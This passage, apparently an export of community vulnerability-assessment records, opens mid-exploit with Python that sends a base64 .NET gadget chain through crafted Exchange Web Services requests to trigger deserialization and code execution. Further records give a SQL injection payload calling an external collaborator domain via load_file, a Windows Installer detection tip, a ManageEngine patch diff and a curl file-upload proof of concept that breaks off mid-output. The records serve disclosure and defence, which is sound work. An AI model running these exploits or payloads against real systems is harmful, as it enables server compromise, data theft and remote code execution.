Ym05emRHbGpjeTVRY205alpYTnpMQ0JUZVhOMFpXMHNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwR0RBQUFBRXR0YzJOdmNteHBZaXdnVm1WeWMybHZiajAwTGpBdU1DNHdMQ0JEZFd4MGRYSmxQVzVsZFhSeVlXd3NJRkIxWW14cFkwdGxlVlJ2YTJWdVBXSTNOMkUxWXpVMk1Ua3pOR1V3T0RrS0JnMEFBQUJKVTNsemRHVnRMQ0JXWlhKemFXOXVQVFF1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OVlqYzNZVFZqTlRZeE9UTTBaVEE0T1FZT0FBQUFHbE41YzNSbGJTNUVhV0ZuYm05emRHbGpjeTVRY205alpYTnpCZzhBQUFBRlUzUmhjblFKRUFBQUFBUUpBQUFBTDFONWMzUmxiUzVTWldac1pXTjBhVzl1TGsxbGJXSmxja2x1Wm05VFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUJ3QUFBQVJPWVcxbERFRnpjMlZ0WW14NVRtRnRaUWxEYkdGemMwNWhiV1VKVTJsbmJtRjBkWEpsQ2xOcFoyNWhkSFZ5WlRJS1RXVnRZbVZ5Vkhsd1pSQkhaVzVsY21salFYSm5kVzFsYm5SekFRRUJBUUVBQXdnTlUzbHpkR1Z0TGxSNWNHVmJYUWtQQUFBQUNRMEFBQUFKRGdBQUFBWVVBQUFBUGxONWMzUmxiUzVFYVdGbmJtOXpkR2xqY3k1UWNtOWpaWE56SUZOMFlYSjBLRk41YzNSbGJTNVRkSEpwYm1jc0lGTjVjM1JsYlM1VGRISnBibWNwQmhVQUFBQStVM2x6ZEdWdExrUnBZV2R1YjNOMGFXTnpMbEJ5YjJObGMzTWdVM1JoY25Rb1UzbHpkR1Z0TGxOMGNtbHVaeXdnVTNsemRHVnRMbE4wY21sdVp5a0lBQUFBQ2dFS0FBQUFDUUFBQUFZV0FBQUFCME52YlhCaGNtVUpEQUFBQUFZWUFBQUFEVk41YzNSbGJTNVRkSEpwYm1jR0dRQUFBQ3RKYm5Rek1pQkRiMjF3WVhKbEtGTjVjM1JsYlM1VGRISnBibWNzSUZONWMzUmxiUzVUZEhKcGJtY3BCaG9BQUFBeVUzbHpkR1Z0TGtsdWRETXlJRU52YlhCaGNtVW9VM2x6ZEdWdExsTjBjbWx1Wnl3Z1UzbHpkR1Z0TGxOMGNtbHVaeWtJQUFBQUNnRVFBQUFBQ0FBQUFBWWJBQUFBY1ZONWMzUmxiUzVEYjIxd1lYSnBjMjl1WURGYlcxTjVjM1JsYlM1VGRISnBibWNzSUcxelkyOXliR2xpTENCV1pYSnphVzl1UFRRdU1DNHdMakFzSUVOMWJIUjFjbVU5Ym1WMWRISmhiQ3dnVUhWaWJHbGpTMlY1Vkc5clpXNDlZamMzWVRWak5UWXhPVE0wWlRBNE9WMWRDUXdBQUFBS0NRd0FBQUFKR0FBQUFBa1dBQUFBQ2dzPQs='\r\n\r\n\r\ndef sendPayload(gadgetChain):\r\n\tget_inbox = '''<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\t<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n\t  <soap:Header>\r\n\t\t<t:RequestServerVersion Version=\"Exchange2013\" />\r\n\t  </soap:Header>\r\n\t  <soap:Body>\r\n\t\t<m:GetFolder>\r\n\t\t  <m:FolderShape>\r\n\t\t\t<t:BaseShape>AllProperties</t:BaseShape>\r\n\t\t  </m:FolderShape>\r\n\t\t  <m:FolderIds>\r\n\t\t\t<t:DistinguishedFolderId Id=\"inbox\" />\r\n\t\t  </m:FolderIds>\r\n\t\t</m:GetFolder>\r\n\t  </soap:Body>\r\n\t</soap:Envelope>\r\n\t'''\r\n\r\n\theaders = {\"User-Agent\": \"ExchangeServicesClient/15.01.2308.008\", \"Content-type\" : \"text/xml; charset=utf-8\"}\r\n\r\n\tres = requests.post(target + \"/ews/exchange.asmx\",\r\n\t\t\t\tdata=get_inbox,\r\n\t\t\t\theaders=headers,\r\n\t\t\t\t\t\t\tverify=False,\r\n\t\t\t\t\t\t\tauth=HttpNtlmAuth('%s' % (USER),\r\n\t\t\t\t\t\t\tPASS))\r\n\r\n\tprint(res.text + \"\\r\\n\")\r\n\tprint(res.encoding + \"\\r\\n\")\r\n\r\n\tfolderId = res.text.split('<t:FolderId Id=\"')[1].split('\"')[0]\r\n\tchangeKey = res.text.split('<t:FolderId Id=\"' + folderId + '\" ChangeKey=\"')[1].split('\"')[0]\r\n\r\n\tprint(folderId + \"\\r\\n\")\r\n\tprint(changeKey + \"\\r\\n\")\r\n\r\n\tdelete_old = '''<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\t<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n\t  <soap:Header>\r\n\t\t<t:RequestServerVersion Version=\"Exchange2013\" />\r\n\t  </soap:Header>\r\n\t  <soap:Body>\r\n\t\t<m:DeleteUserConfiguration>\r\n\t\t  <m:UserConfigurationName Name=\"ExtensionMasterTable\">\r\n\t\t\t<t:FolderId Id=\"%s\" ChangeKey=\"%s\" />\r\n\t\t  </m:UserConfigurationName>\r\n\t\t</m:DeleteUserConfiguration>\r\n\t  </soap:Body>\r\n\t</soap:Envelope>''' % (folderId, changeKey)\r\n\r\n\tres = requests.post(target + \"/ews/exchange.asmx\",\r\n\t\t\t\tdata=delete_old,\r\n\t\t\t\theaders=headers,\r\n\t\t\t\t\t\t\tverify=False,\r\n\t\t\t\t\t\t\tauth=HttpNtlmAuth('%s' % (USER),\r\n\t\t\t\t\t\t\tPASS))\r\n\r\n\tprint(res.text)\r\n\tprint(\"\\r\\n\")\r\n\r\n\tcreate_usr_cfg = '''<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\t<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n\t  <soap:Header>\r\n\t\t<t:RequestServerVersion Version=\"Exchange2013\" />\r\n\t  </soap:Header>\r\n\t  <soap:Body>\r\n\t\t<m:CreateUserConfiguration>\r\n\t\t  <m:UserConfiguration>\r\n\t\t\t<t:UserConfigurationName Name=\"ExtensionMasterTable\">\r\n\t\t\t  <t:FolderId Id=\"%s\" ChangeKey=\"%s\" />\r\n\t\t\t</t:UserConfigurationName>\r\n\t\t\t<t:Dictionary>\r\n\t\t\t  <t:DictionaryEntry>\r\n\t\t\t\t<t:DictionaryKey>\r\n\t\t\t\t  <t:Type>String</t:Type>\r\n\t\t\t\t  <t:Value>OrgChkTm</t:Value>\r\n\t\t\t\t</t:DictionaryKey>\r\n\t\t\t\t<t:DictionaryValue>\r\n\t\t\t\t  <t:Type>Integer64</t:Type>\r\n\t\t\t\t  <t:Value>637728170914745525</t:Value>\r\n\t\t\t\t</t:DictionaryValue>\r\n\t\t\t  </t:DictionaryEntry>\r\n\t\t\t  <t:DictionaryEntry>\r\n\t\t\t\t<t:DictionaryKey>\r\n\t\t\t\t  <t:Type>String</t:Type>\r\n\t\t\t\t  <t:Value>OrgDO</t:Value>\r\n\t\t\t\t</t:DictionaryKey>\r\n\t\t\t\t<t:DictionaryValue>\r\n\t\t\t\t  <t:Type>Boolean</t:Type>\r\n\t\t\t\t  <t:Value>false</t:Value>\r\n\t\t\t\t</t:DictionaryValue>\r\n\t\t\t  </t:DictionaryEntry>\r\n\t\t\t  <t:DictionaryEntry>\r\n\t\t\t\t<t:DictionaryKey>\r\n\t\t\t\t  <t:Type>String</t:Type>\r\n\t\t\t\t  <t:Value>OrgExtV</t:Value>\r\n\t\t\t\t</t:DictionaryKey>\r\n\t\t\t\t<t:DictionaryValue>\r\n\t\t\t\t  <t:Type>Integer32</t:Type>\r\n\t\t\t\t  <t:Value>2147483647</t:Value>\r\n\t\t\t\t</t:DictionaryValue>\r\n\t\t\t  </t:DictionaryEntry>\r\n\t\t\t</t:Dictionary>\r\n\t\t\t<t:BinaryData>%s</t:BinaryData>\r\n\t\t  </m:UserConfiguration>\r\n\t\t</m:CreateUserConfiguration>\r\n\t  </soap:Body>\r\n\t</soap:Envelope>''' % (folderId, changeKey, gadgetChain)\r\n\r\n\tres = requests.post(target + \"/ews/exchange.asmx\",\r\n\t\t\t\tdata=create_usr_cfg,\r\n\t\t\t\theaders=headers,\r\n\t\t\t\t\t\t\tverify=False,\r\n\t\t\t\t\t\t\tauth=HttpNtlmAuth('%s' % (USER),\r\n\t\t\t\t\t\t\tPASS))\r\n\r\n\tprint(res.text)\r\n\tprint(\"\\r\\n\")\r\n\tprint(\"Got the request sent, now to trigger deserialization!\\r\\n\\r\\n\")\r\n\r\n\tget_client_ext = '''<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\t<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n\t  <soap:Header>\r\n\t\t<t:RequestServerVersion Version=\"Exchange2013\" />\r\n\t  </soap:Header>\r\n\t  <soap:Body>\r\n\t\t<m:GetClientAccessToken>\r\n\t\t  <m:TokenRequests>\r\n\t\t\t<t:TokenRequest>\r\n\t\t\t  <t:Id>aaaa</t:Id>\r\n\t\t\t  <t:TokenType>CallerIdentity</t:TokenType>\r\n\t\t\t</t:TokenRequest>\r\n\t\t  </m:TokenRequests>\r\n\t\t</m:GetClientAccessToken>\r\n\t  </soap:Body>\r\n\t</soap:Envelope>\r\n\t'''\r\n\r\n\tres = requests.post(target + \"/ews/exchange.asmx\",\r\n\t\t\t\tdata=get_client_ext,\r\n\t\t\t\theaders=headers,\r\n\t\t\t\t\t\t\tverify=False,\r\n\t\t\t\t\t\t\tauth=HttpNtlmAuth('%s' % (USER),\r\n\t\t\t\t\t\t\tPASS))\r\n\tprint(res.text)\r\n\tprint(\"\\r\\n\")\r\n\tprint(\"Triggered deserialization!\\r\\n\\r\\n\")\r\n\r\nsendPayload(gadgetData)\r\n```\r\n\r\n# Notes\r\nProcess will spawn under the `w3wp.exe` process running `MSExchangeServicesAppPool`.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "1bd40f9d-292d-435a-88a1-40d5432bf1df",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "e01aec4f-3eca-4354-8483-8bfdc7c4e877",
      "created": "2021-11-21T22:11:53.60129Z",
      "revisionDate": "2021-11-21T22:13:29.752241Z",
      "document": "Bug in Linksys X3000 1.0.03 build 001 currently being exploited in the wild by the BotenaGo botnet which is targeting routers to build its botnet out. Likely trying to use this bug to build a network of zombie routers similar to the Mirai botnet and then use that along with amplification attacks to perform DoS attacks.\r\n\r\nMore info available at https://cybersecurity.att.com/blogs/labs-research/att-alien-labs-finds-new-golang-malwarebotenago-targeting-millions-of-routers-and-iot-devices-with-more-than-30-exploits",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "2b5931d5-c920-43fc-ad3a-ad944bf2a50f",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "d2bd023e-70fe-4a28-86f2-2f189cd3a0f2",
      "created": "2021-11-22T11:55:36.219483Z",
      "revisionDate": "2023-05-17T07:59:39.666682Z",
      "document": "## [CVE-2021-41648](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41648)\r\n\r\n## [Vendor](https://github.com/puneethreddyhc)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41648/docs/Screenshot%202021-11-22%20132638-fullstack-developer.png)\r\n\r\n## [Software](https://github.com/PuneethReddyHC/online-shopping-system-advanced)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41648/docs/Screenshot%202021-11-22%20132834-wallpaper.png)\r\n\r\n## Description:\r\nThe p parameter of the PuneethReddyHC online-shopping-system-advanced 1.0 appears to be vulnerable to SQL injection attacks. \r\nThe payload (select load_file `('\\\\\\\\grb7dmacp8fse7awai6uedfhi8o2cz0q2et1jp8.nu11secur1tycollaborator.net\\\\mpv'))` was submitted in the p parameter. \r\nThis payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. \r\nThe application interacted with that domain, indicating that the injected SQL query was executed. \r\nThe malicious user can attack the database using four SQL injection methods `(UNION query, time-based blind, error-based and boolean-based blind)`, \r\nthen he can dump all information from this database of the app, then he can log in to the admin account, and can do malicious stuff. \r\nConclusion: Status Critical.\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-41648)\r\n\r\n## Proof and Exploit:\r\n[href](https://www.nu11secur1ty.com/2021/11/cve-2021-41648.html)\r\n\r\n## Action:\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41648/docs/Screenshot%202021-11-22%20135201-in-action.png)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "bfaecfa4-332f-4ff3-85e9-284019c38b17",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "fe7e2037-f0e0-48d7-8f74-c9682bc04a73",
      "created": "2021-11-22T15:59:47.589669Z",
      "revisionDate": "2021-11-22T15:59:47.588064Z",
      "document": "According to Florian Roth: \"You can detect the exploitation of Windows InstallerFileTakeOver LPE CVE-2021-41379 with the published PoC with events from the 'Application' Eventlog\r\nSearch for EventID 1033 and the keyword 'test pkg'\r\nhttps://twitter.com/cyb3rops/status/1462711685484101634",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "fc194d81-4af3-4bf8-9dae-9e0f388ee153",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "fe7e2037-f0e0-48d7-8f74-c9682bc04a73",
      "created": "2021-11-24T21:16:50.986389Z",
      "revisionDate": "2021-11-25T07:20:35.681435Z",
      "document": "The patch bypass for this vulnerability is now being exploited in the wild as noted at https://blog.talosintelligence.com/2021/11/attackers-exploiting-zero-day.html. I have not labeled this bug as exploited in the wild though as the code noted below by @kevthehermit is an exploit for a variant of this bug, not this bug itself, however it is important to note that the bugs are related and no patch exists yet for the variant at the time of writing (November 24th 2021).",
      "score": 0,
      "metadata": {},
      "tags": []
    },
    {
      "id": "f71592af-8331-4b73-b0c9-8fdb1aee246d",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "7e41e345-9f56-44a2-98ff-0e5aaa21c040",
      "created": "2021-11-28T05:20:18.256088Z",
      "revisionDate": "2021-11-30T13:43:18.442414Z",
      "document": "The affected endpoint is `/RestAPI/WC/NotificationTemplate/attachFiles` with parameter `UPLOADED_FILE`. The vulnerability can be exploited as the `SYSTEM` user if the server is [started as a service](https://www.manageengine.com/products/ad-manager/help/getting_started/installing_admanager_plus.html#Installing_ADManager_Plus_as_a_Windows_Service).\r\n\r\n# Patch\r\n\r\nFile(name) extension is now validated against an allowlist.\r\n\r\n```diff\r\n+\t\t<url path=\"/RestAPI/WC/NotificationTemplate/attachFiles\" method=\"post\" dynamic-params=\"true\" csrf=\"true\">\r\n+\t\t\t<file name=\"UPLOADED_FILE\" content-type-name=\"notificationTemplateAttachments\" max-size=\"25600\" allowed-extensions=\"jpg,jpeg,gif,bmp,ico,png,csv,pdf,html,xls,xlsx\">\r\n+\t\t\t\t<filename regex=\"allowedFileNameChars\" max-len=\"255\"/>\r\n+\t\t\t</file>\r\n+\t\t</url>\r\n```\r\n\r\n```diff\r\n   public String attachFiles(HttpServletRequest request, HttpServletResponse response) throws Exception {\r\n     JSONObject responseObj = new JSONObject();\r\n     ADSResourceBundle rb = null;\r\n     Long userId = ObjectFactory.getInstance().getUserAdapter().getUserId();\r\n     try {\r\n       rb = I18N.getInstance().getBundle(userId);\r\n       JSONObject fileDetails = FileUtil.getFileFromRequest(request, \"UPLOADED_FILE\");\r\n       if (fileDetails.has(\"FILE_NAME\") && fileDetails.has(\"FILE\")) {\r\n-        String directory = NotificationTemplateHandler.getInstance().getRelativeEmberAppDirectory();\r\n-        String fileName = System.currentTimeMillis() + \"_\" + fileDetails.optString(\"FILE_NAME\", null);\r\n-        InputStream is = null;\r\n-        OutputStream os = null;\r\n-        try {\r\n-          File inputFile = (File)fileDetails.get(\"FILE\");\r\n-          is = new FileInputStream(inputFile);\r\n-          os = ObjectFactory.getInstance().getFileAdapter().writeCommonFile(directory + fileName);\r\n-          byte[] buffer = new byte[(int)inputFile.length()];\r\n-          int length;\r\n-          while ((length = is.read(buffer)) > 0)\r\n-            os.write(buffer, 0, length);\r\n-        } catch (Exception fileException) {\r\n-          logger.log(Level.INFO, \"Exception while file operations\", fileException);\r\n-        } finally {\r\n-          if (is != null)\r\n-            is.close();\r\n-          if (os != null)\r\n-            os.close();\r\n+        boolean isValidfileExtension = FileUtil.validateImageFileExtension(fileDetails.optString(\"FILE_NAME\"), 5000L);\r\n+        if (isValidfileExtension) {\r\n+          String directory = NotificationTemplateHandler.getInstance().getRelativeEmberAppDirectory();\r\n+          String fileName = System.currentTimeMillis() + \"_\" + fileDetails.optString(\"FILE_NAME\", null);\r\n+          InputStream is = null;\r\n+          OutputStream os = null;\r\n+          try {\r\n+            File inputFile = (File)fileDetails.get(\"FILE\");\r\n+            is = new FileInputStream(inputFile);\r\n+            os = ObjectFactory.getInstance().getFileAdapter().writeCommonFile(directory + fileName);\r\n+            byte[] buffer = new byte[(int)inputFile.length()];\r\n+            int length;\r\n+            while ((length = is.read(buffer)) > 0)\r\n+              os.write(buffer, 0, length);\r\n+          } catch (Exception fileException) {\r\n+            logger.log(Level.INFO, \"Exception while file operations\", fileException);\r\n+          } finally {\r\n+            if (is != null)\r\n+              is.close();\r\n+            if (os != null)\r\n+              os.close();\r\n+          }\r\n+          String fileURL = NotificationTemplateHandler.getInstance().getWebAppContext() + File.separator + fileName;\r\n+          responseObj.put(\"FILE_NAME\", fileName);\r\n+          responseObj.put(\"FILE_URL\", fileURL);\r\n+          responseObj.put(\"sSTATUS\", rb.getString(\"ads.notification_template.files_attach.success\"));\r\n         }\r\n-        String fileURL = NotificationTemplateHandler.getInstance().getWebAppContext() + File.separator + fileName;\r\n-        responseObj.put(\"FILE_NAME\", fileName);\r\n-        responseObj.put(\"FILE_URL\", fileURL);\r\n-        responseObj.put(\"sSTATUS\", rb.getString(\"ads.notification_template.files_attach.success\"));\r\n       } else {\r\n         responseObj.put(\"eSTATUS\", rb.getString(\"ads.notification_template.files_attach.error\"));\r\n       }\r\n     } catch (Exception e) {\r\n       responseObj.put(\"eSTATUS\", rb.getString(\"ads.notification_template.files_attach.error\"));\r\n       logger.log(Level.INFO, e.getMessage(), e);\r\n     }\r\n     CommonUtil.setResponseText(response, responseObj.toString());\r\n     return null;\r\n   }\r\n```\r\n\r\n```diff\r\n package com.manageengine.ads.fw.common.util;\r\n\r\n import com.adventnet.iam.security.SecurityRequestWrapper;\r\n+import com.adventnet.iam.security.UploadFileRule;\r\n import com.adventnet.iam.security.UploadedFileItem;\r\n import java.io.BufferedReader;\r\n import java.io.File;\r\n import java.io.FileInputStream;\r\n import java.io.InputStreamReader;\r\n import java.util.List;\r\n import java.util.logging.Level;\r\n import java.util.logging.Logger;\r\n import javax.servlet.http.HttpServletRequest;\r\n import org.apache.commons.fileupload.FileItem;\r\n import org.apache.commons.fileupload.FileItemFactory;\r\n import org.apache.commons.fileupload.disk.DiskFileItemFactory;\r\n import org.apache.commons.fileupload.servlet.ServletFileUpload;\r\n import org.apache.commons.io.FilenameUtils;\r\n import org.json.JSONObject;\r\n\r\n public class FileUtil {\r\n   private static Logger logger = Logger.getLogger(\"ADSLogger\");\r\n\r\n+  public static final String[] DEFAULT_IMAGE_EXTENSION = new String[] {\r\n+      \"jpg\", \"png\", \"gif\", \"jpeg\", \"tiff\", \"pjp\", \"pjpeg\", \"jfif\", \"tif\", \"svg\",\r\n+      \"bmp\", \"svgz\", \"webp\", \"ico\", \"xbm\", \"dib\" };\r\n+\r\n+  public static final String[] DEFAULT_ZIP_EXTENSION = new String[] { \"zip\" };\r\n+\r\n+  public static final String[] DEFAULT_ICON_EXTENSION = new String[] { \"ico\" };\r\n+\r\n+  public static final String DEFAULT_FILE_NAME_REGEX = \"^[a-zA-Z0-9._ -]+$\";\r\n+\r\n   public static JSONObject getFileFromRequest(HttpServletRequest httpServletRequest, String paramName) {\r\n     JSONObject json = new JSONObject();\r\n     File file = null;\r\n     String fileName = null;\r\n     Long fileSize = null;\r\n     try {\r\n       if (ServletRequestHandler.isInstanceOfSecurityWrapper(httpServletRequest)) {\r\n         SecurityRequestWrapper secrequest = (SecurityRequestWrapper)httpServletRequest;\r\n         UploadedFileItem item = secrequest.getMultipartParameter(paramName);\r\n         if (item != null) {\r\n           file = item.getUploadedFile();\r\n           fileName = item.getFileName();\r\n           fileSize = Long.valueOf(item.getFileSize());\r\n         }\r\n         json.put(\"FILE\", file);\r\n         json.put(\"FILE_NAME\", fileName);\r\n         json.put(\"FILE_SIZE\", fileSize);\r\n       } else {\r\n         List<FileItem> multiparts = (new ServletFileUpload((FileItemFactory)new DiskFileItemFactory())).parseRequest(httpServletRequest);\r\n         json = getFileFromMultipartRequest(multiparts, paramName);\r\n       }\r\n     } catch (Exception e) {\r\n       logger.log(Level.INFO, \"Error in getting the file from request \");\r\n     }\r\n     return json;\r\n   }\r\n\r\n   public static String getFileContent(File file, String delimiter) {\r\n     BufferedReader bufRead = null;\r\n     String ret = null;\r\n     try {\r\n       StringBuffer outBuf = new StringBuffer();\r\n       InputStreamReader is = new InputStreamReader(new FileInputStream(file), \"UTF-8\");\r\n       bufRead = new BufferedReader(is);\r\n       boolean startWrite = false;\r\n       String line = bufRead.readLine();\r\n       while (line != null) {\r\n         if (delimiter != null && !delimiter.equals(\"\")) {\r\n           if (line.contains(delimiter))\r\n             startWrite = true;\r\n           if (startWrite)\r\n             outBuf.append(line);\r\n           if (line.contains(\"/\" + delimiter))\r\n             startWrite = false;\r\n         } else {\r\n           outBuf.append(line);\r\n         }\r\n         line = bufRead.readLine();\r\n       }\r\n       ret = outBuf.toString();\r\n     } catch (Exception e) {\r\n       logger.log(Level.INFO, \"\", e);\r\n     } finally {\r\n       try {\r\n         if (bufRead != null)\r\n           bufRead.close();\r\n       } catch (Exception e) {\r\n         logger.log(Level.INFO, \"Error : \" + e);\r\n       }\r\n     }\r\n     return ret;\r\n   }\r\n\r\n   public static JSONObject getFileFromMultipartRequest(List multiparts, String paramName) {\r\n     JSONObject file = new JSONObject();\r\n     try {\r\n       for (FileItem item : multiparts) {\r\n         if (!item.isFormField() && item.getFieldName().equals(paramName)) {\r\n           String fileName = FilenameUtils.getName(item.getName());\r\n           File storeFile = new File(System.getProperty(\"java.io.tmpdir\") + File.separator + fileName);\r\n           storeFile.deleteOnExit();\r\n           item.write(storeFile);\r\n           file.put(\"FILE\", storeFile);\r\n           file.put(\"FILE_NAME\", fileName);\r\n           file.put(\"FILE_SIZE\", item.getSize());\r\n           break;\r\n         }\r\n       }\r\n     } catch (Exception e) {\r\n       e.printStackTrace();\r\n     }\r\n     return file;\r\n   }\r\n+\r\n+  public static boolean validateFileExtension(String fileName, String fieldName, String allowedContentTypeName, long maxSizeInKB, String[] allowedExtensions, String xssPattern, String fileNameRegex) {\r\n+    if (fileName != null) {\r\n+      UploadFileRule uploadFileRule = new UploadFileRule(fieldName, allowedContentTypeName, maxSizeInKB, allowedExtensions, xssPattern, fileNameRegex);\r\n+      return uploadFileRule.validateExtension(fileName);\r\n+    }\r\n+    return false;\r\n+  }\r\n+\r\n+  public static boolean validateFileExtension(String fileName, String fieldName, String allowedContentTypeName, long maxSizeInKB, String[] allowedExtensions) {\r\n+    return validateFileExtension(fileName, fieldName, allowedContentTypeName, maxSizeInKB, allowedExtensions, null, \"^[a-zA-Z0-9._ -]+$\");\r\n+  }\r\n+\r\n+  public static boolean validateImageFileExtension(String fileName, long maxfileSizeInKB) {\r\n+    return validateFileExtension(fileName, \"IMAGE_FILE\", \"image\", maxfileSizeInKB, DEFAULT_IMAGE_EXTENSION, null, \"^[a-zA-Z0-9._ -]+$\");\r\n+  }\r\n+\r\n+  public static boolean validateZipFileExtension(String fileName, long maxfileSizeInKB) {\r\n+    return validateFileExtension(fileName, \"ZIP_FILE\", \"zip\", maxfileSizeInKB, DEFAULT_ZIP_EXTENSION, null, \"^[a-zA-Z0-9._ -]+$\");\r\n+  }\r\n+\r\n+  public static boolean validateIconFileExtension(String fileName, long maxfileSizeInKB) {\r\n+    return validateFileExtension(fileName, \"ICON_FILE\", \"icon\", maxfileSizeInKB, DEFAULT_ICON_EXTENSION, null, \"^[a-zA-Z0-9._ -]+$\");\r\n+  }\r\n }\r\n```\r\n\r\n# PoC\r\n\r\n_Note that I've already logged in. **Default accounts/creds are available.**_\r\n\r\n```\r\nwvu@kharak:~$ curl -vb JSESSIONIDADSMSSO=0547AC6728E5FE0977DBF5F9D2A61892 http://172.16.57.222:8080/RestAPI/WC/NotificationTemplate/attachFiles -F \"UPLOADED_FILE=@-;filename=foo.txt\" <<<bar\r\n*   Trying 172.16.57.222:8080...\r\n* Connected to 172.16.57.222 (172.16.57.222) port 8080 (#0)\r\n> POST /RestAPI/WC/NotificationTemplate/attachFiles HTTP/1.1\r\n> Host: 172.16.57.222:8080\r\n> User-Agent: curl/7.80.0\r\n> Accept: */*\r\n> Cookie: JSESSIONIDADSMSSO=0547AC6728E5FE0977DBF5F9D2A61892\r\n> Content-Length: 198\r\n> Content-Type: multipart/form-data; boundary=------------------------98cb9d38d953de55\r\n>\r\n* We are completely uploaded and fine\r\n* Mark bundle as not supporting multiuse\r\n< HTTP/1.1 200\r\n< Set-Cookie: JSESSIONIDADMP=3EEABEA724F597559A78BE12A903D6C1; Path=/; HttpOnly\r\n< Cache-Control: no-cache, no-store\r\n< Pragma: no-cache\r\n< Expires: Thu, 01 Jan 1970 00:00:00 GMT\r\n< X-XSS-Protection: 1; mode=block\r\n< Strict-Transport-Security: max-age=31536000 ; includeSubDomains\r\n< vary: accept-encoding\r\n< Content-Type: text/html;charset=UTF-8\r\n< Content-Length: 155\r\n< Date: Mon, 29 Nov 2021 03:44:11 GMT\r\n< Server: ADMP\r\n<\r\n* Connection #0 to host 172.16.57.222 left intact\r\n{\"sSTATUS\":\"Files are successfully attached.\",\"FILE_NAME\":\"1638157451470_foo.txt\",\"FILE_URL\":\"/ompemberapp/NotificationTemplates\\\\\\\\1638157451470_foo.txt\"}wvu@kharak:~$\r\n```\r\n\r\n```\r\nwvu@kharak:~$ curl -v http://172.16.57.222:8080/ompemberapp/NotificationTemplates/1638157451470_foo.txt\r\n*   Trying 172.16.57.222:8080...\r\n* Connected to 172.16.57.222 